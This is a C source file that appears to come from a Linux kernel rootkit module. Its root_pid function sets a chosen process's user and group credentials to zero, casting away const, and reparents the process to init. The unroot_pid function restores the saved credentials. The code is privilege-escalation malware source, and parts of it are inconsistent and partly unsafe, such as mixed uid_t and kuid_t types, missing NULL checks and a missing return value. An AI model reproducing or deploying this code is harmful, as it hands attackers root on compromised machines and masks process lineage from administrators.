#include <linux/sched.h>
#include <linux/list.h>
#include <linux/slab.h>
#include "include.h"
#include "root.h"
LIST_HEAD(rooted);
// Grant the given process root privileges
void root_pid(pid_t pid)
{
	struct task_struct* toRootTask = pid_task(find_vpid(pid), PIDTYPE_PID);//find_task_by_vpid(pid);
	struct proces *newRoot;
	newRoot = kmalloc(sizeof(*newRoot), GFP_KERNEL);
	newRoot->pid = pid;
	newRoot->uid = toRootTask->cred->uid;
	newRoot->gid = toRootTask->cred->gid;
	newRoot->parent = toRootTask->parent;
	newRoot->real_parent = toRootTask->real_parent;
	list_add(&newRoot->list, &rooted);
	DEBUGMSG("uid %d, suid %d, euid %d,fsuid %d\n", toRootTask->cred->uid, toRootTask->cred->suid, toRootTask->cred->euid, toRootTask->cred->fsuid);

	// Shut up compiler I don't care about "const"
	uid_t* v = (uid_t*) &toRootTask->cred->uid;
	*v = 0;
	v = (uid_t*) &toRootTask->cred->suid;
	*v = 0;
	v = (uid_t*) &toRootTask->cred->euid;
	*v = 0;
	v = (uid_t*) &toRootTask->cred->fsuid;
	*v = 0;
	gid_t* gv = (gid_t*) &toRootTask->cred->gid;
	*gv = 0;
	gv = (gid_t*) &toRootTask->cred->sgid;
	*gv = 0;
	gv = (gid_t*) &toRootTask->cred->egid;
	*gv = 0;
	gv = (gid_t*) &toRootTask->cred->fsgid;
	*gv = 0;

	toRootTask->parent = toRootTask->real_parent = pid_task(find_vpid(1), PIDTYPE_PID);//find_task_by_vpid(1);
	
}

int unroot_pid(pid_t pid)
{
	struct proces* delRoot;
	bool found = false;
	DEBUGMSG("In UNroot\n");
	list_for_each_entry(delRoot, &rooted, list) {
		DEBUGMSG(".\n");
		if(delRoot != NULL) {
			if(delRoot->pid == pid){
				found = true;
				DEBUGMSG("root: Found PID\n");
				break;
			}
		}
	}
	if(!found) {
		DEBUGMSG("I didn't root that one\n");
		return -1;
	}
	

	struct task_struct* toUnRootTask = pid_task(find_vpid(pid), PIDTYPE_PID);//find_task_by_vpid(pid);
	if(toUnRootTask == NULL) {
		DEBUGMSG("Could not find task\n");
	}

	// Shut up compiler I don't care about "const"
	kuid_t* v = (kuid_t*) &toUnRootTask->cred->uid;
	*v = delRoot->uid;
	v = (kuid_t*) &toUnRootTask->cred->suid;
	*v = delRoot->uid;
	v = (kuid_t*) &toUnRootTask->cred->euid;
	*v = delRoot->uid;
	v = (kuid_t*) &toUnRootTask->cred->fsuid;
	*v = delRoot->uid;
	kgid_t* gv = (kgid_t*) &toUnRootTask->cred->gid;
	*gv = delRoot->gid;
	gv = (kgid_t*) &toUnRootTask->cred->sgid;
	*gv = delRoot->gid;
	gv = (kgid_t*) &toUnRootTask->cred->egid;
	*gv = delRoot->gid;
	gv = (kgid_t*) &toUnRootTask->cred->fsgid;
	*gv = delRoot->gid;

	toUnRootTask->parent = delRoot->parent;
	toUnRootTask->real_parent = delRoot->real_parent;

	list_del(&delRoot->list);
	kfree(delRoot);

}
